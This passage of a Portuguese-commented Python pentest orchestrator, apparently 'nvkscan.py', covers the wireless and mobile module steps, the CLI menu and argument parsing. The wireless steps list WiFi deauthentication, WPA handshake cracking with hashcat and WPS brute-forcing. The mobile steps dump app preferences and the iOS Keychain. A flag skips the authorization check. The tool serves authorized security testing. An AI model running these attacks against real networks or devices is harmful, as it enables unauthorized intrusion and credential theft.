        "nao e extraivel de um APK Android, so de um IPA real): `python3 dump.py <bundle_id>`",
        f"M5.6: checar dados salvos (Android, pacote real {pkg}) -- precisa de device/emulador "
        f"com o app instalado: `adb shell run-as {pkg} cat shared_prefs/*.xml`",
        "M5.6 (iOS): checar Keychain via objection, precisa de device/emulador com o app "
        "instalado e --bundle_id do IPA real (nao extraivel de um APK): `ios keychain dump`",
    ]
    return manual_steps


# =============================================================================
# MODULO 6 -- WIRELESS (so setup/captura; crack de verdade exige hardware +
# tempo de captura de handshake, nao e algo pra rodar "sem supervisao")
# =============================================================================

def module_wireless(iface, log, findings, workdir):
    if not iface:
        log.skip("informe --iface <interface wifi>, ex.: --iface wlan0")
        return ["M6.1: rode de novo com --iface <sua interface wifi>"]

    log.step("M6.1 Setup e recon")
    if require_tool("airmon-ng", log):
        run(f"airmon-ng check kill", log, timeout=30)
        run(f"airmon-ng start {iface}", log, timeout=30)
        log.ok(f"modo monitor deveria estar ativo em {iface}mon (confirme com iwconfig)")

    log.warn("Captura de handshake e crack precisam de voce escolher o BSSID/canal na hora")
    log.warn("(airodump-ng pra escolher o alvo, aireplay-ng --deauth, hashcat -m 22000).")
    log.warn("Isso exige interacao em tempo real, nao faz sentido automatizar as cegas.")

    manual_steps = [
        f"M6.1: `airodump-ng {iface}mon` pra listar redes e escolher o BSSID/canal alvo",
        f"M6.2: `airodump-ng -c <canal> --bssid <BSSID> -w captura {iface}mon` (captura) + "
        f"`aireplay-ng --deauth 5 -a <BSSID> {iface}mon` (forca handshake) + "
        f"`hashcat -m 22000 captura.hccapx /usr/share/wordlists/rockyou.txt` (crack)",
        f"M6.3: `reaver -i {iface}mon -b <BSSID> -vv` ou `bully {iface}mon -b <BSSID>` pra WPS, se aplicavel",
        "Deauth so com autorizacao explicita no ROE (ver checklist do Modulo 6)",
    ]
    return manual_steps


# =============================================================================
# MENU / CLI
# =============================================================================

MODULES = {
    "web": "Modulo 1, Pentest Web",
    "bugbounty": "Modulo 2, Bug Bounty",
    "redteam": "Modulo 3, Red Team (so recon/TTP mapping)",
    "cloud": "Modulo 4, Cloud (AWS/Azure/GCP)",
    "mobile": "Modulo 5, Mobile (analise estatica de APK)",
    "wireless": "Modulo 6, Wireless (setup/recon)",
    "api": "Modulo 6B, API Pentest Avancado",
    "dcpt": "Modulo 7, DCPT (so recon, sem auto-exploit)",
}


def interactive_menu():
    print_banner()
    keys = list(MODULES.keys())
    print(f"{C.CYAN}[01]{C.RESET} {C.BOLD}selecione o modulo{C.RESET}")
    print()
    for i, k in enumerate(keys, 1):
        name = MODULE_SHORT.get(k, k)
        tag = MODULE_TAGS.get(k, "")
        print(f"  {C.RED}{C.BOLD}{i:02d}{C.RESET}  {name:<16}{C.GRAY}{tag}{C.RESET}")
    print()
    if not sys.stdin.isatty():
        print(f"{C.RED}Sem terminal interativo e nenhum --module informado. Use --module "
              f"<{'|'.join(MODULES.keys())}> pra rodar sem menu.{C.RESET}")
        sys.exit(1)
    choice = input(f"{C.CYAN}❯{C.RESET} modulo : ").strip()
    try:
        idx = int(choice) - 1
        if idx < 0:
            raise ValueError
        return keys[idx]
    except (ValueError, IndexError):
        print(f"{C.RED}Opcao invalida.{C.RESET}")
        sys.exit(1)


def prompt(label, default=None):
    # sem terminal de verdade (stdin nao e tty: rodando scriptado, cron, CI,
    # chamado por outra ferramenta), nunca tenta input() -- isso travava com
    # EOFError. So retorna o default direto; quem chama ja valida se faltou.
    if not sys.stdin.isatty():
        return default
    suffix = f" [{default}]" if default else ""
    resp = input(f"{C.CYAN}❯{C.RESET} {label}{suffix}: ").strip()
    return resp or default


def prompt_yesno(label, default_no=True):
    if not sys.stdin.isatty():
        return not default_no
    hint = "s/N" if default_no else "S/n"
    resp = input(f"{C.CYAN}❯{C.RESET} {label} [{hint}]: ").strip().lower()
    if not resp:
        return not default_no
    return resp in ("s", "sim", "y", "yes")


def fill_missing_args(module, args, interactive):
    """Completa interativamente os parametros que o modulo escolhido precisa
    e que nao vieram via linha de comando -- corrige o caso de rodar so
    'python3 nvkscan.py' e escolher o modulo pelo menu."""
    if module in ("web", "bugbounty", "redteam", "api") and not args.domain:
        args.domain = prompt("dominio alvo (ex.: alvo.com)")
        if not args.domain:
            print(f"{C.RED}dominio e obrigatorio pra esse modulo.{C.RESET}")
            sys.exit(1)
    if module == "web" and not args.url:
        args.url = prompt("URL completa", default=f"https://{args.domain}")
    if module == "web" and interactive and not args.wordlist:
        resp = prompt("caminho do wordlist de diretorios (enter pra detectar sozinho, ex.: SecLists)")
        if resp:
            args.wordlist = resp
    if module == "dcpt" and not args.domain and not args.ip:
        args.ip = prompt("IP do alvo")
        if not args.ip:
            print(f"{C.RED}IP ou dominio e obrigatorio pro modulo dcpt.{C.RESET}")
            sys.exit(1)
    if module == "mobile" and not args.apk:
        args.apk = prompt("caminho do APK")
    if module == "wireless" and not args.iface:
        args.iface = prompt("interface wifi (ex.: wlan0)")
    if module == "bugbounty" and interactive and not args.program:
        args.program = prompt("nome do programa de bug bounty (opcional)")
    if module == "cloud":
        if interactive:
            resp = prompt("provedor [aws/azure/gcp/all]", default="all")
            if resp in ("aws", "azure", "gcp", "all"):
                args.provider = resp
            if not args.client:
                args.client = prompt("nome do cliente/engajamento (usado pra nomear a pasta de resultados)")
            if not args.aws_profile and args.provider in ("aws", "all"):
                resp = prompt("profile da AWS CLI (enter pra usar o profile default/ja ativo)")
                if resp:
                    args.aws_profile = resp
        if not args.client:
            print(f"{C.RED}--client e obrigatorio pro modulo cloud (nao ha dominio/IP aqui pra "
                  f"identificar o alvo, precisa de um nome de cliente/engajamento pra nomear a pasta).{C.RESET}")
            sys.exit(1)
    if module == "redteam":
        if args.apt_group:
            gid = args.apt_group.strip().upper()
            match = next((v for v in APT_GROUPS.values() if v[0] == gid), None)
            args.resolved_apt_group = match or (gid, gid, "informado manualmente, fora do catalogo curado")
        elif interactive:
            args.resolved_apt_group = choose_apt_group(interactive=True)
        else:
            args.resolved_apt_group = APT_GROUPS["1"]
    if interactive and not args.active:
        args.active = prompt_yesno("habilitar deteccao ativa (nuclei/dalfox/sqlmap)?")
    return args


def main():
    # forca saida linha-a-linha mesmo quando redirecionada pra arquivo/pipe
    # (ex.: "python3 nvkscan.py ... > scan.log &"), senao o Python
    # bufferiza tudo e o log fica mudo ate o processo terminar
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass
    ap = argparse.ArgumentParser(description="Orquestrador unico dos modulos do pentest_metodologia.html")
    ap.add_argument("--module", choices=list(MODULES.keys()), help="modulo a rodar (omita pra menu interativo)")
    ap.add_argument("-d", "--domain", help="dominio alvo, ex.: alvo.com")
    ap.add_argument("-u", "--url", help="URL completa (default: https://<domain>)")
    ap.add_argument("--urls-file", help="arquivo com uma URL/dominio por linha, roda o modulo em lote "
                                         "(so pros modulos web, api e bugbounty)")
    ap.add_argument("--wordlist", help="caminho manual do wordlist de diretorios (modulo web). "
                                        "Se nao informar, o script tenta achar o SecLists sozinho (locate/find)")
    ap.add_argument("--wordlist-size", choices=["small", "medium", "large"], default="small",
                     help="tamanho da wordlist de diretorio do SecLists quando --wordlist nao for informado "
                          "(default: small -- testado na pratica, 'medium'/'large' facilmente estouram os "
                          "600s do ffuf contra alvo externo real, mesmo com poucas extensoes e depth baixo)")
    ap.add_argument("--recursion-depth", type=int, default=1,
                     help="profundidade de recursao do ffuf no modulo web (default: 1). Cada nivel multiplica "
                          "bastante o numero de requisicoes -- depth=2 com wordlist grande nao termina dentro "
                          "do timeout em alvos com muitas pastas reais. Use 0 pra desativar recursao")
    ap.add_argument("--threads", type=int, default=20,
                     help="numero de requests em paralelo pros checks do modulo web (default: 20)")
    ap.add_argument("--apt-group", help="ID do grupo MITRE ATT&CK pro modulo redteam (ex.: G0046). "
                                         "Se nao informar, pergunta no modo interativo ou usa APT29 (G0016) por padrao")
    ap.add_argument("--client", help="nome do cliente/engajamento, usado pra nomear a pasta de resultados e a "
                                      "autorizacao. Principal pro modulo cloud, que nao tem dominio/IP como alvo")
    ap.add_argument("--aws-profile", help="profile da AWS CLI a usar (aws --profile X ...). Sem isso usa o "
                                           "profile default/ja ativo no ambiente")
    ap.add_argument("--ip", help="IP do alvo (usado no modulo dcpt)")
    ap.add_argument("--program", help="nome do programa de bug bounty (modulo bugbounty)")
    ap.add_argument("--provider", choices=["aws", "azure", "gcp", "all"], default="all",
                     help="provedor cloud a enumerar (modulo cloud)")
    ap.add_argument("--apk", help="caminho do APK (modulo mobile)")
    ap.add_argument("--iface", help="interface wifi, ex.: wlan0 (modulo wireless)")
    ap.add_argument("--active", action="store_true",
                     help="habilita deteccao ativa (nuclei completo, dalfox, sqlmap em modo deteccao)")
    ap.add_argument("-o", "--outdir", help="pasta de saida (default: ~/pentest/<modulo>/<alvo>)")
    ap.add_argument("--skip-auth-gate", action="store_true",
                     help="(uso interno/CI apenas) pula a confirmacao interativa de autorizacao")
    args = ap.parse_args()

    interactive = args.module is None
    module = args.module or interactive_menu()

    if args.urls_file:
        if module not in ("web", "api", "bugbounty"):
            print(f"{C.RED}--urls-file so funciona com os modulos web, api ou bugbounty.{C.RESET}")
            sys.exit(1)
        targets = parse_targets_file(args.urls_file)
        if not targets:
            print(f"{C.RED}Lista vazia ou arquivo nao encontrado: {args.urls_file}{C.RESET}")
            sys.exit(1)
        if interactive and not args.active:
            args.active = prompt_yesno("habilitar deteccao ativa (nuclei/dalfox/sqlmap) pra todos os alvos do lote?")

        label = f"LOTE de {len(targets)} alvo(s) ({Path(args.urls_file).name})"
        authorization_gate(label, MODULES[module], args.active, skip=args.skip_auth_gate)

        batch_workdir = (Path(args.outdir) if args.outdir
                          else Path.home() / "pentest" / module / f"lote_{Path(args.urls_file).stem}")
        batch_workdir.mkdir(parents=True, exist_ok=True)
        batch_log = Log(batch_workdir / "session.log")
        batch_findings = Findings()
        batch_log.step(f"Lote com {len(targets)} alvo(s)")

        run_batch(module, targets, args, batch_log, batch_findings, batch_workdir)

        write_report(batch_workdir, MODULES[module] + " (lote)", label, args.active, batch_findings,
                     [f"Relatorios individuais por alvo em {batch_workdir}/<dominio>/RESULTADOS.md"], batch_log)
        return

    args = fill_missing_args(module, args, interactive)
    apk_label = Path(args.apk).stem if args.apk else None  # so o nome do arquivo, nao o caminho inteiro
    label = args.client or args.domain or apk_label or args.iface or (args.provider if args.provider != "all" else None) or "alvo"
    workdir = Path(args.outdir) if args.outdir else make_workdir(module, label)
    # bug real: so criava as subpastas quando o outdir era o default
    # (make_workdir ja fazia isso sozinho) -- com --outdir customizado as
    # ferramentas tentavam escrever em recon/enum/etc. que nao existiam e
    # falhavam silenciosamente (gau, katana, waybackurls, todas com erro
    # "could not create output" ou "No such file or directory"), gerando
    # relatorio vazio sem nenhum aviso claro do motivo real
    for sub in ("recon", "enum", "exploit", "evidence"):
        (workdir / sub).mkdir(parents=True, exist_ok=True)

    authorization_gate(label, MODULES[module], args.active, skip=args.skip_auth_gate)
    log = Log(workdir / "session.log")
    findings = Findings()

    if module == "web":
        if not args.domain:
            print("--domain e obrigatorio pro modulo web"); sys.exit(1)
        manual_steps = module_web(args.domain, args.url, args.active, log, findings, workdir,
                                   wordlist_override=args.wordlist, threads=args.threads,
                                   wordlist_size=args.wordlist_size, recursion_depth=args.recursion_depth)
    elif module == "bugbounty":
        if not args.domain:
            print("--domain e obrigatorio pro modulo bugbounty"); sys.exit(1)
        manual_steps = module_bugbounty(args.domain, args.program, args.active, log, findings, workdir)
    elif module == "redteam":
        if not args.domain:
            print("--domain e obrigatorio pro modulo redteam"); sys.exit(1)
        manual_steps = module_redteam(args.domain, log, findings, workdir,
                                       apt_group=getattr(args, "resolved_apt_group", None))
    elif module == "cloud":
        manual_steps = module_cloud(args.provider, log, findings, workdir, aws_profile=args.aws_profile)
    elif module == "mobile":
        manual_steps = module_mobile(args.apk, log, findings, workdir)
    elif module == "wireless":
        manual_steps = module_wireless(args.iface, log, findings, workdir)
    elif module == "api":
        if not args.domain:
            print("--domain e obrigatorio pro modulo api"); sys.exit(1)
        manual_steps = module_api(args.domain, args.url, args.active, log, findings, workdir, threads=args.threads)
    elif module == "dcpt":
        if not args.domain and not args.ip:
            print("--domain ou --ip e obrigatorio pro modulo dcpt"); sys.exit(1)
        manual_steps = module_dcpt(args.domain, args.ip, log, findings, workdir)
    else:
        print("Modulo desconhecido"); sys.exit(1)

    write_report(workdir, MODULES[module], label, args.active, findings, manual_steps, log)


if __name__ == "__main__":
    main()
